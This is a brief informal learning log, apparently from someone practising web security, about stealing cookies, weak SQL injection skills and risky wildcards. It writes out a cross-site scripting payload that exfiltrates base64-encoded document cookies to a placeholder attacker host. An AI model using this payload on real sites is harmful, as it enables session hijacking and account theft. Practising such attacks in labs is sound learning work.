So today I stoal my first cookies... yeah, this is something I need to remember:

~<script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>~

Nevertheles I was directly humbled afterwards as I have seen that the SQLi basics are definetly not that good on my side and that
without SQLmap I'm quite helpless.

Furthermore I discoverd that even wildcards can be quite dangerous in script
Unbeliveable what you have to avoid :)
